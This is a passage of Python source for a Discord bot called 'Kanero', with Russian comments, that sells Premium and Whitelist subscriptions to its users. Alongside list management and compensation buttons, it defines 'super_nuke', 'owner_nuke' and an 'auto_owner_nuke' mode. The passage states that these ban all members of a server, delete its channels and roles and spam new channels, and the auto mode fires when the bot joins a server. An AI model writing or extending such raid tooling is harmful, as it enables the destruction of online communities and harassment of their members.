    actual_input = user_input
    if len(parts) == 2:
        try:
            duration_hours = _parse_duration(parts[1])
            actual_input = parts[0].strip()
        except (ValueError, Exception):
            actual_input = user_input

    # Режим ALL — выдать всем участникам домашнего сервера
    if actual_input.lower() == "all":
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if not home_guild:
            await ctx.send("❌ Домашний сервер не найден.")
            return
        msg = await ctx.send("⏳ Выдаю Premium всем участникам...")
        count = 0
        prem_role = discord.utils.find(lambda r: r.name == "💎 Premium", home_guild.roles)
        white_role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
        for member in home_guild.members:
            if member.bot:
                continue
            uid = member.id
            if duration_hours:
                add_temp_subscription(uid, "pm", duration_hours)
            else:
                if uid not in PREMIUM_LIST:
                    PREMIUM_LIST.append(uid)
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
            roles_to_add = [r for r in [prem_role, white_role] if r and r not in member.roles]
            if roles_to_add:
                try:
                    await member.add_roles(*roles_to_add, reason="pm_add all")
                except Exception:
                    pass
            count += 1
        if not duration_hours:
            save_premium()
            save_whitelist()
        days = duration_hours // 24 if duration_hours else 0
        dur_text = f" на **{days} дн.**" if duration_hours else " навсегда"
        await msg.edit(content=f"✅ **Premium**{dur_text} выдан **{count}** участникам.")
        return

    # Обычный режим — один пользователь
    user = await resolve_user(ctx, actual_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{actual_input}` не найден.")
        return
    user_id = user.id

    if duration_hours:
        add_temp_subscription(user_id, "pm", duration_hours)
        days = duration_hours // 24
        duration_text = f"{days} дн." if days > 0 else f"{duration_hours} ч."
        result_text = f"💎 **{user}** получил **Premium** на **{duration_text}** (временно)."
    else:
        if user_id not in PREMIUM_LIST:
            PREMIUM_LIST.append(user_id)
            save_premium()
        if user_id not in config.WHITELIST:
            config.WHITELIST.append(user_id)
            save_whitelist()
        if user_id in FREELIST:
            FREELIST.remove(user_id)
            save_freelist()
        result_text = f"💎 **{user}** (`{user_id}`) получил **Premium** навсегда."
        result_text = f"💎 **{user}** (`{user_id}`) получил **Premium** навсегда."

    # Выдаём роль
    try:
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if home_guild:
            member = home_guild.get_member(user_id)
            if not member:
                try:
                    member = await home_guild.fetch_member(user_id)
                except Exception:
                    member = None
            if member:
                prem_role  = discord.utils.find(lambda r: r.name == "💎 Premium", home_guild.roles)
                white_role = discord.utils.find(lambda r: r.name == "✅ White",   home_guild.roles)
                user_role  = discord.utils.find(lambda r: r.name == "👥 User",    home_guild.roles)
                roles_to_add    = [r for r in [prem_role, white_role] if r and r not in member.roles]
                roles_to_remove = [r for r in [user_role] if r and r in member.roles]
                if roles_to_add:
                    await member.add_roles(*roles_to_add, reason="pm_add")
                if roles_to_remove:
                    await member.remove_roles(*roles_to_remove, reason="pm_add upgrade")
            await update_stats_channels(home_guild)
    except Exception:
        pass
    await ctx.send(result_text)


@bot.command(name="pm_remove")
async def pm_remove(ctx, *, user_input: str):
    # Только владелец сервера может использовать
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return
    user = await resolve_user(ctx, user_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
        return
    user_id = user.id
    if user_id in PREMIUM_LIST:
        PREMIUM_LIST.remove(user_id)
        save_premium()
        try:
            home_guild = bot.get_guild(HOME_GUILD_ID)
            if home_guild:
                member = home_guild.get_member(user_id)
                if member:
                    role = discord.utils.find(lambda r: r.name == "💎 Premium", home_guild.roles)
                    if role and role in member.roles:
                        await member.remove_roles(role, reason="pm_remove")
                await update_stats_channels(home_guild)
        except Exception:
            pass
        await ctx.send(f"✅ **{user}** убран из Premium.")
    else:
        await ctx.send("Не найден в Premium.")


@bot.command(name="pm_list")
async def pm_list(ctx):
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return
    now = datetime.utcnow()
    temp_pm = [(uid, s) for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "pm" and now < s["expires"]]
    lines = []
    for uid in PREMIUM_LIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` — **{user}**")
        except Exception:
            lines.append(f"`{uid}` — *не найден*")
    for uid, s in temp_pm:
        if uid not in PREMIUM_LIST:
            try:
                user = await bot.fetch_user(uid)
                lines.append(f"`{uid}` — **{user}** ⏳ <t:{int(s['expires'].timestamp())}:R>")
            except Exception:
                lines.append(f"`{uid}` ⏳ <t:{int(s['expires'].timestamp())}:R>")
    embed = discord.Embed(title="💎 Premium список", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
    embed.set_footer(text=f"☠️ Kanero  |  Постоянных: {len(PREMIUM_LIST)}  |  Временных: {len(temp_pm)}")
    await ctx.send(embed=embed)


@bot.command(name="fl_list")
async def fl_list(ctx):
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return
    now = datetime.utcnow()
    temp_fl = [(uid, s) for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "fl" and now < s["expires"]]
    lines = []
    for uid in FREELIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` — **{user}**")
        except Exception:
            lines.append(f"`{uid}` — *не найден*")
    for uid, s in temp_fl:
        if uid not in FREELIST:
            try:
                user = await bot.fetch_user(uid)
                lines.append(f"`{uid}` — **{user}** ⏳ <t:{int(s['expires'].timestamp())}:R>")
            except Exception:
                lines.append(f"`{uid}` ⏳ <t:{int(s['expires'].timestamp())}:R>")
    embed = discord.Embed(title="📋 Freelist", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
    embed.set_footer(text=f"☠️ Kanero  |  Постоянных: {len(FREELIST)}  |  Временных: {len(temp_fl)}")
    await ctx.send(embed=embed)


def _parse_duration(duration_str: str) -> int:
    """Парсит строку длительности в часы. Поддерживает: 2d, 24h, 48, 1d12h и т.д."""
    duration_str = duration_str.lower().strip()
    total_hours = 0
    import re
    matches = re.findall(r'(\d+)\s*([dh]?)', duration_str)
    if not matches:
        raise ValueError(f"Не удалось распознать длительность: `{duration_str}`")
    for value, unit in matches:
        value = int(value)
        if unit == 'd':
            total_hours += value * 24
        elif unit == 'h' or unit == '':
            total_hours += value
    if total_hours <= 0:
        raise ValueError("Длительность должна быть больше 0")
    return total_hours


class CompensationView(discord.ui.View):
    """Кнопка получения компенсации. Работает пока не истечёт время."""

    def __init__(self, sub_type: str, hours: int, expires_at: datetime):
        super().__init__(timeout=None)
        self.sub_type = sub_type
        self.hours = hours
        self.expires_at = expires_at
        self.claimed: set[int] = set()

        sub_names = {"wl": "✅ White", "pm": "💎 Premium", "fl": "📋 Freelist"}
        self.sub_name = sub_names.get(sub_type, sub_type)

    @discord.ui.button(label="🎁 Получить компенсацию", style=discord.ButtonStyle.green, custom_id="claim_comp_v2")
    async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = interaction.user

        # Проверяем не истекло ли время акции
        if datetime.utcnow() > self.expires_at:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="⏰ Время истекло",
                    description="Срок получения этой компенсации уже закончился.",
                    color=0xff6b6b
                ),
                ephemeral=True
            )
            return

        # Уже получил — проверяем и в памяти и в TEMP_SUBSCRIPTIONS
        already_claimed = user.id in self.claimed
        if not already_claimed and user.id in TEMP_SUBSCRIPTIONS:
            sub = TEMP_SUBSCRIPTIONS[user.id]
            if sub["type"] == self.sub_type and datetime.utcnow() < sub["expires"]:
                already_claimed = True

        if already_claimed:
            await interaction.response.send_message(
                embed=discord.Embed(
                    title="✅ Вы уже получили компенсацию",
                    description=(
                        f"Вы уже получили **{self.sub_name}**.\n"
                        f"Используй `!help` чтобы посмотреть доступные команды."
                    ),
                    color=0x2b2d31
                ),
                ephemeral=True
            )
            return

        self.claimed.add(user.id)

        # Выдаём подписку
        add_temp_subscription(user.id, self.sub_type, self.hours)

        # Выдаём роль на домашнем сервере
        home_guild = bot.get_guild(HOME_GUILD_ID)
        role_given = False
        if home_guild:
            role_map = {"wl": "✅ White", "pm": "💎 Premium", "fl": "👥 User"}
            role_name = role_map.get(self.sub_type)
            if role_name:
                member = home_guild.get_member(user.id)
                if not member:
                    try:
                        member = await home_guild.fetch_member(user.id)
                    except Exception:
                        member = None
                if member:
                    role = discord.utils.find(lambda r: r.name == role_name, home_guild.roles)
                    if role:
                        try:
                            await member.add_roles(role, reason="Компенсация")
                            role_given = True
                        except Exception:
                            pass

        days = self.hours // 24
        duration_text = f"{days} дн." if days > 0 else f"{self.hours} ч."

        # Отвечаем пользователю
        await interaction.response.send_message(
            embed=discord.Embed(
                title="✅ Компенсация получена!",
                description=(
                    f"**Подписка:** {self.sub_name}\n"
                    f"**Длительность:** {duration_text}\n"
                    f"**Истекает:** <t:{int((datetime.utcnow() + timedelta(hours=self.hours)).timestamp())}:R>\n\n"
                    f"{'Роль выдана на сервере.' if role_given else 'Используй `!help` для списка команд.'}"
                ),
                color=0x00ff00
            ).set_footer(text="☠️ Kanero  |  discord.gg/aud6wwYVRd"),
            ephemeral=True
        )

        # Пишем в admin-chat
        if home_guild:
            admin_ch = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), home_guild.text_channels)
            if admin_ch:
                try:
                    await admin_ch.send(
                        embed=discord.Embed(
                            title="💰 Компенсация получена",
                            description=(
                                f"**Пользователь:** {user.mention} (`{user.id}`)\n"
                                f"**Подписка:** {self.sub_name}\n"
                                f"**Длительность:** {duration_text}"
                            ),
                            color=0x00ff00
                        ).set_footer(text="☠️ Kanero")
                    )
                except Exception:
                    pass


@bot.command(name="compensate")
async def compensate_cmd(ctx, sub_type: str = None, duration_str: str = None):
    """Объявить компенсацию с кнопкой получения. Только для овнера.
    Использование: !compensate pm 1d
    """
    if ctx.author.id != config.OWNER_ID:
        return

    if not sub_type or not duration_str:
        await ctx.send(
            "❌ **Неверное использование.**\n"
            "Правильно: `!compensate <тип> <время>`\n\n"
            "**Типы:** `wl` — White · `pm` — Premium · `fl` — Freelist\n"
            "**Время:** `2d` — 2 дня · `48h` — 48 часов · `24` — 24 часа\n\n"
            "**Пример:** `!compensate pm 1d`"
        )
        return

    if sub_type.lower() not in ("wl", "pm", "fl"):
        await ctx.send(
            f"❌ Неверный тип `{sub_type}`.\n"
            "Доступные типы: `wl` — White · `pm` — Premium · `fl` — Freelist"
        )
        return

    try:
        hours = _parse_duration(duration_str)
    except ValueError as e:
        await ctx.send(f"❌ {e}\nПримеры: `2d` · `48h` · `24`")
        return

    sub_names = {"wl": "✅ White", "pm": "💎 Premium", "fl": "📋 Freelist"}
    sub_name = sub_names[sub_type.lower()]
    days = hours // 24
    duration_text = f"{days} дн. ({hours} ч.)" if days > 0 else f"{hours} ч."

    # Время истечения акции — 1 день на получение
    claim_deadline = datetime.utcnow() + timedelta(days=1)

    # Ищем канал компенсации на домашнем сервере
    home_guild = bot.get_guild(HOME_GUILD_ID)
    if not home_guild:
        await ctx.send("❌ Домашний сервер не найден.")
        return

    comp_ch = discord.utils.find(lambda c: "компенсац" in c.name.lower(), home_guild.text_channels)
    if not comp_ch:
        await ctx.send("❌ Канал компенсации не найден (нужен канал с 'компенсац' в названии).")
        return

    embed = discord.Embed(
        title="🎁 Компенсация для всех!",
        description=(
            f"**Подписка:** {sub_name}\n"
            f"**Длительность:** {duration_text}\n"
            f"**Получить до:** <t:{int(claim_deadline.timestamp())}:R>\n\n"
            "Нажми кнопку ниже чтобы получить подписку и роль на сервере."
        ),
        color=0xffd700
    )
    embed.set_footer(text="☠️ Kanero  |  Компенсация за найденный баг")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")

    view = CompensationView(sub_type.lower(), hours, claim_deadline)
    comp_msg = await comp_ch.send(content="@everyone", embed=embed, view=view)

    # Анонс в новостях
    news_ch = discord.utils.find(
        lambda c: "новост" in c.name.lower() or "news" in c.name.lower(),
        home_guild.text_channels
    )
    if news_ch:
        try:
            news_embed = discord.Embed(
                title="🎁 Доступна компенсация!",
                description=(
                    f"Для всех участников доступна бесплатная подписка **{sub_name}** на {duration_text}!\n\n"
                    f"Перейди в {comp_ch.mention} и нажми кнопку чтобы получить.\n\n"
                    f"**Получить до:** <t:{int(claim_deadline.timestamp())}:R>"
                ),
                color=0xffd700
            )
            news_embed.set_footer(text="☠️ Kanero  |  Нажми кнопку в канале компенсации")
            news_embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
            await news_ch.send(content="@everyone", embed=news_embed)
        except Exception:
            pass

    # Уведомляем в admin-chat
    admin_ch = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), home_guild.text_channels)
    if admin_ch:
        try:
            await admin_ch.send(
                embed=discord.Embed(
                    title="📢 Компенсация объявлена",
                    description=(
                        f"**Тип:** {sub_name}\n"
                        f"**Длительность:** {duration_text}\n"
                        f"**Канал:** {comp_ch.mention}\n"
                        f"**Получить до:** <t:{int(claim_deadline.timestamp())}:R>"
                    ),
                    color=0xffd700
                ).set_footer(text=f"Объявил: {ctx.author}")
            )
        except Exception:
            pass

    await ctx.message.delete()  # удаляем команду чтобы не засорять канал

    # Таск — через 24 часа напомнить в admin-chat удалить сообщение
    async def remind_delete():
        await asyncio.sleep(86400)  # 24 часа
        try:
            hg = bot.get_guild(HOME_GUILD_ID)
            if not hg:
                return
            ac = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), hg.text_channels)
            if ac:
                await ac.send(
                    embed=discord.Embed(
                        title="🗑️ Время компенсации истекло",
                        description=(
                            f"Компенсация **{sub_name}** завершена.\n\n"
                            f"Не забудь удалить сообщение в {comp_ch.mention}!"
                        ),
                        color=0xff6b6b
                    ).set_footer(text="☠️ Kanero")
                )
            # Пробуем удалить сообщение автоматически
            try:
                await comp_msg.delete()
            except Exception:
                pass
        except Exception:
            pass

    asyncio.create_task(remind_delete())


@bot.command(name="announce_bug")
async def announce_bug_cmd(ctx, *, message: str = None):
    """Объявить о баге в канале новостей. Только для овнера.
    Использование: !announce_bug Название | Описание что случилось и что исправлено
    """
    if ctx.author.id != config.OWNER_ID:
        return

    if not message:
        await ctx.send(
            "❌ **Неверное использование.**\n"
            "Правильно: `!announce_bug Название | Описание`\n\n"
            "**Пример:** `!announce_bug Автокраш сервера | Бот автоматически крашил наш сервер при перезапуске. Баг исправлен в v2.3.`"
        )
        return

    # Разделяем на название и описание
    if "|" in message:
        parts = message.split("|", 1)
        bug_title = parts[0].strip()
        bug_description = parts[1].strip()
    else:
        bug_title = "Исправлен баг"
        bug_description = message.strip()

    # Ищем канал новостей на домашнем сервере
    home_guild = bot.get_guild(HOME_GUILD_ID)
    if not home_guild:
        await ctx.send("❌ Домашний сервер не найден.")
        return

    news_channel = discord.utils.find(
        lambda c: "новост" in c.name.lower() or "news" in c.name.lower(),
        home_guild.text_channels
    )
    if not news_channel:
        await ctx.send("❌ Канал новостей не найден на домашнем сервере.")
        return

    embed = discord.Embed(
        title=f"🐛 Исправлен баг: {bug_title}",
        description=bug_description,
        color=0xff6b6b,
        timestamp=datetime.utcnow()
    )
    embed.add_field(
        name="✅ Статус",
        value="Баг полностью исправлен и обновление уже активно.",
        inline=False
    )
    embed.add_field(
        name="💰 Компенсация",
        value=(
            "Если вас затронул этот баг — напишите в тикет, мы выдадим компенсацию.\n"
            "За критические баги компенсация выдаётся автоматически всем пострадавшим."
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  Спасибо за терпение!")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")

    try:
        await news_channel.send(content="@everyone", embed=embed)
        # Пишем подтверждение в admin-chat, а не в канал новостей
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if home_guild:
            admin_ch = discord.utils.find(lambda c: "admin-chat" in c.name.lower(), home_guild.text_channels)
            if admin_ch:
                await admin_ch.send(f"✅ Объявление о баге опубликовано в {news_channel.mention}")
    except Exception as e:
        await ctx.send(f"❌ Ошибка при публикации: {e}")


@bot.command(name="list")
async def list_cmd(ctx):
    # Владелец сервера ИЛИ OWNER_ID из конфига
    is_server_owner = ctx.guild and ctx.author.id == ctx.guild.owner_id
    is_bot_owner = ctx.author.id == config.OWNER_ID
    if not is_server_owner and not is_bot_owner:
        return

    async def fmt(ids):
        lines = []
        for uid in ids:
            try:
                user = await bot.fetch_user(uid)
                name = f"`{uid}` — **{user}**"
            except Exception:
                name = f"`{uid}` — *не найден*"
            # Проверяем есть ли временная подписка
            if uid in TEMP_SUBSCRIPTIONS:
                sub = TEMP_SUBSCRIPTIONS[uid]
                if datetime.utcnow() < sub["expires"]:
                    expires_ts = int(sub["expires"].timestamp())
                    name += f" ⏳ <t:{expires_ts}:R>"
            lines.append(name)
        return "\n".join(lines) if lines else "*пусто*"

    embed = discord.Embed(title="📋 Списки Kanero", color=0x0a0a0a)
    protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
    now = datetime.utcnow()

    # Собираем ID из временных подписок (только активные)
    temp_wl = {uid for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "wl" and now < s["expires"]}
    temp_pm = {uid for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "pm" and now < s["expires"]}
    temp_fl = {uid for uid, s in TEMP_SUBSCRIPTIONS.items() if s["type"] == "fl" and now < s["expires"]}

    # Freelist — постоянные + временные (без дублей с wl/pm)
    fl_only = list(dict.fromkeys(
        [uid for uid in FREELIST if uid not in config.WHITELIST and uid not in PREMIUM_LIST]
        + [uid for uid in temp_fl if uid not in config.WHITELIST and uid not in PREMIUM_LIST and uid not in FREELIST]
    ))
    # Whitelist — постоянные + временные
    wl_only = list(dict.fromkeys(
        [uid for uid in config.WHITELIST if uid not in PREMIUM_LIST and uid not in protected]
        + [uid for uid in temp_wl if uid not in PREMIUM_LIST and uid not in protected and uid not in config.WHITELIST]
    ))
    # Premium — постоянные + временные
    pm_all = list(dict.fromkeys(
        list(PREMIUM_LIST)
        + [uid for uid in temp_pm if uid not in PREMIUM_LIST]
    ))
    embed.add_field(name=f"📋 Freelist ({len(fl_only)})",                        value=await fmt(fl_only),              inline=False)
    embed.add_field(name=f"✅ Whitelist ({len(wl_only)})",                        value=await fmt(wl_only),              inline=False)
    embed.add_field(name=f"💎 Premium ({len(pm_all)})",                           value=await fmt(pm_all),               inline=False)
    embed.add_field(name=f"👑 Owner Whitelist ({len(config.OWNER_WHITELIST)})",   value=await fmt(config.OWNER_WHITELIST), inline=False)

    # Временные подписки — показываем только если есть активные
    temp_lines = []
    for uid, sub in list(TEMP_SUBSCRIPTIONS.items()):
        if now > sub["expires"]:
            continue
        sub_names = {"wl": "✅ White", "pm": "💎 Premium", "fl": "📋 Freelist"}
        sub_name = sub_names.get(sub["type"], sub["type"])
        expires_ts = int(sub["expires"].timestamp())
        try:
            user = await bot.fetch_user(uid)
            temp_lines.append(f"`{uid}` — **{user}** | {sub_name} | <t:{expires_ts}:R>")
        except Exception:
            temp_lines.append(f"`{uid}` | {sub_name} | <t:{expires_ts}:R>")
    if temp_lines:
        value = "\n".join(temp_lines)
        if len(value) > 1020:
            value = value[:1020] + "..."
        embed.add_field(name=f"⏳ Временные подписки ({len(temp_lines)})", value=value, inline=False)

    embed.add_field(
        name="📌 Управление",
        value=(
            "`!fl_add/remove/clear` — freelist\n"
            "`!wl_add/remove` — whitelist\n"
            "`!pm_add/remove` — premium"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


@bot.command(name="sync_roles")
async def sync_roles_cmd(ctx):
    """Проверяет и синхронизирует роли всех участников листов на домашнем сервере."""
    if ctx.author.id != config.OWNER_ID:
        return

    guild = bot.get_guild(HOME_GUILD_ID)
    if not guild:
        await ctx.send("❌ Домашний сервер не найден.")
        return

    msg = await ctx.send("🔄 Синхронизирую роли...")

    role_white   = discord.utils.find(lambda r: r.name == "✅ White",   guild.roles)
    role_premium = discord.utils.find(lambda r: r.name == "💎 Premium", guild.roles)
    role_user    = discord.utils.find(lambda r: r.name == "👥 User",    guild.roles)
    role_guest   = discord.utils.find(lambda r: r.name == "👤 Guest",   guild.roles)

    given = []
    removed = []
    missing = []

    # Загружаем всех участников сервера (на случай если кэш неполный)
    if not guild.chunked:
        await guild.chunk()

    # Выдаём Guest всем участникам у кого её нет
    if role_guest:
        for member in guild.members:
            if member.bot:
                continue
            if role_guest not in member.roles:
                try:
                    await member.add_roles(role_guest, reason="sync_roles: авто Guest")
                    given.append(f"👤 {member} → Guest")
                except Exception:
                    pass

    # Собираем всех кто должен быть в каком листе
    wl_ids  = set(config.WHITELIST)
    pm_ids  = set(PREMIUM_LIST)
    fl_ids  = set(FREELIST)

    for uid in wl_ids | pm_ids | fl_ids:
        member = guild.get_member(uid)
        if not member:
            try:
                member = await guild.fetch_member(uid)
            except Exception:
                # Нет на сервере — снимаем из листов
                kicked_from = []
                if uid in config.WHITELIST:
                    config.WHITELIST.remove(uid)
                    save_whitelist()
                    kicked_from.append("✅ White")
                if uid in PREMIUM_LIST:
                    PREMIUM_LIST.remove(uid)
                    save_premium()
                    kicked_from.append("💎 Premium")
                if uid in FREELIST:
                    FREELIST.remove(uid)
                    save_freelist()
                    kicked_from.append("📋 Freelist")
                if kicked_from:
                    missing.append(f"`{uid}` — убран из: {', '.join(kicked_from)}")
                else:
                    missing.append(f"`{uid}`")
                continue

        # Premium
        if uid in pm_ids:
            if role_premium and role_premium not in member.roles:
                try:
                    await member.add_roles(role_premium, reason="sync_roles")
                    given.append(f"💎 {member} → Premium")
                except Exception:
                    pass
        # Whitelist (не premium)
        elif uid in wl_ids:
            if role_white and role_white not in member.roles:
                try:
                    await member.add_roles(role_white, reason="sync_roles")
                    given.append(f"✅ {member} → White")
                except Exception:
                    pass
        # Freelist
        elif uid in fl_ids:
            if role_user and role_user not in member.roles:
                try:
                    await member.add_roles(role_user, reason="sync_roles")
                    given.append(f"👥 {member} → User")
                except Exception:
                    pass

    # Проверяем участников сервера — снимаем роли если их нет в листах
    for member in guild.members:
        if member.bot:
            continue
        uid = member.id
        if role_premium and role_premium in member.roles and uid not in pm_ids and uid != config.OWNER_ID:
            try:
                await member.remove_roles(role_premium, reason="sync_roles: не в premium листе")
                removed.append(f"💎 {member} ← убрана Premium")
            except Exception:
                pass
        if role_white and role_white in member.roles and uid not in wl_ids and uid not in pm_ids and uid != config.OWNER_ID:
            try:
                await member.remove_roles(role_white, reason="sync_roles: не в whitelist")
                removed.append(f"✅ {member} ← убрана White")
            except Exception:
                pass

    lines = []
    if given:
        lines.append("**Выдано:**\n" + "\n".join(given))
    if removed:
        lines.append("**Снято:**\n" + "\n".join(removed))
    if missing:
        lines.append(f"**Не на сервере — удалены из листов ({len(missing)}):**\n" + "\n".join(missing))
    if not given and not removed and not missing:
        lines.append("✅ Все роли в порядке, ничего не изменено.")

    embed = discord.Embed(
        title="🔄 Синхронизация ролей",
        description="\n\n".join(lines),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero  |  !list — посмотреть листы")
    await msg.edit(content=None, embed=embed)


@bot.command(name="list_clear")
async def list_clear(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
    wl_removed = len([uid for uid in config.WHITELIST if uid not in protected])
    pm_removed = len(PREMIUM_LIST)
    fl_removed = len(FREELIST)
    config.WHITELIST[:] = [uid for uid in config.WHITELIST if uid in protected]
    PREMIUM_LIST.clear()
    FREELIST.clear()
    save_whitelist()
    save_premium()
    save_freelist()
    embed = discord.Embed(
        title="🗑️ Все списки очищены",
        description=(
            f"Whitelist: удалено **{wl_removed}**\n"
            f"Premium: удалено **{pm_removed}**\n"
            f"Freelist: удалено **{fl_removed}**\n"
            "Овнеры сохранены."
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


# ─── PREMIUM COMMANDS ──────────────────────────────────────

def premium_check():
    async def predicate(ctx):
        if ctx.guild and is_guild_blocked(ctx.guild.id):
            return False
        if not is_whitelisted(ctx.author.id):
            embed = discord.Embed(
                title="☠️ ДОСТУП ЗАПРЕЩЁН",
                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero")
            await ctx.send(embed=embed)
            return False
        if not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
            embed = discord.Embed(
                title="💎 PREMIUM ФУНКЦИЯ",
                description="Эта команда доступна только **Premium** пользователям.\n\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero")
            await ctx.send(embed=embed)
            return False
        return True
    return commands.check(predicate)


@bot.command(name="super_nuke")
@premium_check()
async def super_nuke(ctx, *, text: str = None):
    guild = ctx.guild
    if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
        return
    if is_guild_blocked(guild.id):
        embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    if nuke_running.get(guild.id):
        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
        await ctx.send(embed=embed)
        return
    nuke_running[guild.id] = True
    nuke_starter[guild.id] = ctx.author.id
    spam_text = text if text else config.SPAM_TEXT
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
    last_spam_text[guild.id] = spam_text
    asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
    asyncio.create_task(log_nuke(guild, ctx.author, "super_nuke"))


# ─── OWNER-ONLY NUKE COMMANDS ──────────────────────────────

AUTO_OWNER_NUKE = False
AUTO_OWNER_NUKE_TEXT = None


def save_auto_owner_nuke():
    asyncio.create_task(db_set("data", "auto_owner_nuke", {
        "enabled": AUTO_OWNER_NUKE,
        "text": AUTO_OWNER_NUKE_TEXT
    }))


@bot.command(name="owner_nuke")
async def owner_nuke(ctx, *, text: str = None):
    """Полный нюк без ограничений. Только для овнера."""
    if not is_owner_nuker(ctx.author.id):
        return
    guild = ctx.guild
    if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
        return
    if is_guild_blocked(guild.id):
        await ctx.send("🔒 Этот сервер заблокирован.")
        return
    if nuke_running.get(guild.id):
        await ctx.send("⚡ Краш уже запущен.")
        return
    nuke_running[guild.id] = True
    nuke_starter[guild.id] = ctx.author.id
    spam_text = text if text else config.SPAM_TEXT
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
    last_spam_text[guild.id] = spam_text
    asyncio.create_task(do_owner_nuke_task(guild, spam_text))
    asyncio.create_task(log_nuke(guild, ctx.author, "owner_nuke"))


@bot.command(name="auto_owner_nuke")
async def auto_owner_nuke_cmd(ctx, state: str, *, text: str = None):
    """Авто owner_nuke при входе бота на сервер. Только для овнера."""
    global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
    if not is_owner_nuker(ctx.author.id):
        return
    if state.lower() == "on":
        AUTO_OWNER_NUKE = True
        save_auto_owner_nuke()
        embed = discord.Embed(
            title="👑 Auto Owner Nuke — ВКЛЮЧЁН",
            description=(
                "При входе бота на сервер:\n"
                "• Бан ВСЕХ участников\n"
                "• Удаление каналов и ролей\n"
                "• Создание каналов со спамом\n\n"
                f"Текст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "off":
        AUTO_OWNER_NUKE = False
        save_auto_owner_nuke()
        await ctx.send("❌ **Auto Owner Nuke** выключен.")
    elif state.lower() == "text":
        if not text:
            await ctx.send("Укажи текст: `!auto_owner_nuke text <текст>`")
            return
        AUTO_OWNER_NUKE_TEXT = text
        save_auto_owner_nuke()
        await ctx.send(f"✅ Текст обновлён:\n```{text[:500]}```")
    elif state.lower() == "info":
        status = "✅ Включён" if AUTO_OWNER_NUKE else "❌ Выключен"
        await ctx.send(f"Auto Owner Nuke: **{status}**\nТекст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`")
    else:
        await ctx.send("`!auto_owner_nuke on/off/text/info`")


@bot.command(name="auto_off")
async def auto_off(ctx):
    """Выключить все авто нюки. Только для владельца сервера."""
    global AUTO_SUPER_NUKE, AUTO_SUPERPR_NUKE, AUTO_OWNER_NUKE
    # Только владелец сервера может использовать
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return
    config.AUTO_NUKE = False
    AUTO_SUPER_NUKE = False
    save_auto_super_nuke()
    AUTO_SUPERPR_NUKE = False
    save_auto_superpr_nuke()
    AUTO_OWNER_NUKE = False
    save_auto_owner_nuke()
    embed = discord.Embed(
        title="🔴 Все авто нюки выключены",
        description=(
            "❌ `auto_nuke` — выключен\n"
            "❌ `auto_super_nuke` — выключен\n"
            "❌ `auto_superpr_nuke` — выключен\n"
            "❌ `auto_owner_nuke` — выключен"
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


@bot.command(name="auto_info")
async def auto_info(ctx):
    """Показать статус всех авто нюков. Только для владельца сервера."""
    # Только владелец сервера может использовать
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return

    def st(val):
        return "✅ Включён" if val else "❌ Выключен"

    embed = discord.Embed(title="📊 Статус авто нюков", color=0x0a0a0a)
    embed.add_field(
        name="🔄 auto_nuke",
        value=f"{st(config.AUTO_NUKE)}\n`!auto_nuke on/off`",
        inline=True
    )
    embed.add_field(
        name="💎 auto_super_nuke",
